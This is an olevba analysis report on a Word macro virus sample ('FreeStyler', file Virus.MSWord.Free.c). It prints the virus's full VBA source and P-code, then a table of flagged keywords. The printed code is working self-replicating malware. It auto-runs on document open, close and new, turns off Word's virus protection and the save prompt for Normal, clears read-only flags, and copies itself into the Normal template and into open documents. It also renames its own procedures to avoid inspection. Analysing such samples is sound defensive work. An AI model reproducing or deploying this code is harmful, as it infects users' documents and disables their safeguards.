olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Free.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO FreeStyler.cls 
in file: Virus.MSWord.Free.c - OLE stream: 'Macros/VBA/FreeStyler'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()
On Error Resume Next
'VOVAN//SMF
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
B = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
C = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
xxx = Mid(B, 13): fff = Len(xxx) - 2: hhh = Left(xxx, fff)
Number = MacroContainer.VBProject.VBComponents(1).CodeModule.ProcCountLines(hhh, vbext_pk_Proc)
VV = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Number)
With MacroContainer.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, Number
.InsertLines C, VV
End With
End Sub
        Sub View()
        Document_New
        End Sub
Private Sub Document_Close()
On Error Resume Next
If ActiveDocument.Name = ActiveDocument.FullName Then Document_New: End
If ActiveDocument.Saved = True Then Call Document_Open Else End
End Sub
        Sub Macro()
        Document_New
        End Sub
Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0: Application.ScreenUpdating = 0
Document_New
If ActiveDocument.ReadOnly = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If NormalTemplate.VBProject.VBComponents.Item(1).Name = "FreeStyler" Then DOT = True
If ActiveDocument.VBProject.VBComponents.Item(1).Name = "FreeStyler" Then DOC = True
If DOT = True And DOC = True Then GoTo 1
If DOT = False Then
Set Acti = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
m = Acti.ProcBodyLine("Macro", vbext_ProcKind)
Acti.replaceline m, "        Sub ToolsMacro()"
a = Acti.ProcBodyLine("View", vbext_ProcKind)
Acti.replaceline a, "        Sub ViewVBcode()"
VV = Acti.Lines(1, FreeStyler.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString VV: End With
NormalTemplate.VBProject.VBComponents.Item(1).Name = "FreeStyler"
m = Acti.ProcBodyLine("ToolsMacro", vbext_ProcKind)
Acti.replaceline m, "        Sub Macro()"
a = Acti.ProcBodyLine("ViewVBcode", vbext_ProcKind)
Acti.replaceline a, "        Sub View()"
End If
If DOC = False Then
Set Norma = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
m = Norma.ProcBodyLine("ToolsMacro", vbext_ProcKind)
Norma.replaceline m, "        Sub Macro()"
a = Norma.ProcBodyLine("ViewVBcode", vbext_ProcKind)
Norma.replaceline a, "        Sub View()"
CC = FreeStyler.VBProject.VBComponents.Item(1).CodeModule.Lines(1, FreeStyler.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString CC: End With
ActiveDocument.VBProject.VBComponents.Item(1).Name = "FreeStyler"
m = Norma.ProcBodyLine("Macro", vbext_ProcKind)
Norma.replaceline m, "        Sub ToolsMacro()"
a = Norma.ProcBodyLine("View", vbext_ProcKind)
Norma.replaceline a, "        Sub ViewVBcode()"
Document_New
End If
If ActiveDocument.FullName = wdOpenFormatDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
1: ActiveDocument.Saved = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Free.c
' ===============================================================================
' Module streams:
' Macros/VBA/FreeStyler - 5364 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_New())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	QuoteRem 0x0000 0x000A "VOVAN//SMF"
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #4:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St B 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St C 
' Line #6:
' 	Ld B 
' 	LitDI2 0x000D 
' 	ArgsLd Mid$ 0x0002 
' 	St xxx 
' 	BoS 0x0000 
' 	Ld xxx 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	St fff 
' 	BoS 0x0000 
' 	Ld xxx 
' 	Ld fff 
' 	ArgsLd LBound 0x0002 
' 	St hhh 
' Line #7:
' 	Ld hhh 
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Number 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld Number 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VV 
' Line #9:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld Number 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #11:
' 	Ld C 
' 	Ld VV 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #12:
' 	EndWith 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Sub View())
' Line #15:
' 	ArgsCall Document_New 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Private Sub Document_Close())
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Document_New 0x0000 
' 	BoS 0x0000 
' 	End 
' 	EndIf 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Document_Open 0x0000 
' 	Else 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Sub Macro())
' Line #23:
' 	ArgsCall Document_New 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Private Sub Document_Open())
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #28:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #30:
' 	ArgsCall Document_New 0x0000 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #33:
' 	Ld ActiveDocument 
' 	ArgsMemCall Reload 0x0000 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "FreeStyler"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DOT 
' 	EndIf 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "FreeStyler"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DOC 
' 	EndIf 
' Line #37:
' 	Ld DOT 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DOC 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #38:
' 	Ld DOT 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #39:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Acti 
' Line #40:
' 	LitStr 0x0005 "Macro"
' 	Ld vbext_ProcKind 
' 	Ld Acti 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St m 
' Line #41:
' 	Ld m 
' 	LitStr 0x0018 "        Sub ToolsMacro()"
' 	Ld Acti 
' 	ArgsMemCall replaceline 0x0002 
' Line #42:
' 	LitStr 0x0004 "View"
' 	Ld vbext_ProcKind 
' 	Ld Acti 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St a 
' Line #43:
' 	Ld a 
' 	LitStr 0x0018 "        Sub ViewVBcode()"
' 	Ld Acti 
' 	ArgsMemCall replaceline 0x0002 
' Line #44:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld FreeStyler 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Acti 
' 	ArgsMemLd Lines 0x0002 
' 	St VV 
' Line #45:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld VV 
' 	ArgsMemCallWith AddFromString 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' Line #46:
' 	LitStr 0x000A "FreeStyler"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #47:
' 	LitStr 0x000A "ToolsMacro"
' 	Ld vbext_ProcKind 
' 	Ld Acti 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St m 
' Line #48:
' 	Ld m 
' 	LitStr 0x0013 "        Sub Macro()"
' 	Ld Acti 
' 	ArgsMemCall replaceline 0x0002 
' Line #49:
' 	LitStr 0x000A "ViewVBcode"
' 	Ld vbext_ProcKind 
' 	Ld Acti 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St a 
' Line #50:
' 	Ld a 
' 	LitStr 0x0012 "        Sub View()"
' 	Ld Acti 
' 	ArgsMemCall replaceline 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld DOC 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Norma 
' Line #54:
' 	LitStr 0x000A "ToolsMacro"
' 	Ld vbext_ProcKind 
' 	Ld Norma 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St m 
' Line #55:
' 	Ld m 
' 	LitStr 0x0013 "        Sub Macro()"
' 	Ld Norma 
' 	ArgsMemCall replaceline 0x0002 
' Line #56:
' 	LitStr 0x000A "ViewVBcode"
' 	Ld vbext_ProcKind 
' 	Ld Norma 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St a 
' Line #57:
' 	Ld a 
' 	LitStr 0x0012 "        Sub View()"
' 	Ld Norma 
' 	ArgsMemCall replaceline 0x0002 
' Line #58:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld FreeStyler 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld FreeStyler 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St CC 
' Line #59:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld CC 
' 	ArgsMemCallWith AddFromString 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' Line #60:
' 	LitStr 0x000A "FreeStyler"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #61:
' 	LitStr 0x0005 "Macro"
' 	Ld vbext_ProcKind 
' 	Ld Norma 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St m 
' Line #62:
' 	Ld m 
' 	LitStr 0x0018 "        Sub ToolsMacro()"
' 	Ld Norma 
' 	ArgsMemCall replaceline 0x0002 
' Line #63:
' 	LitStr 0x0004 "View"
' 	Ld vbext_ProcKind 
' 	Ld Norma 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St a 
' Line #64:
' 	Ld a 
' 	LitStr 0x0018 "        Sub ViewVBcode()"
' 	Ld Norma 
' 	ArgsMemCall replaceline 0x0002 
' Line #65:
' 	ArgsCall Document_New 0x0000 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld wdOpenFormatDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #68:
' 	LineNum 1 
' 	BoS 0x0003 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #69:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

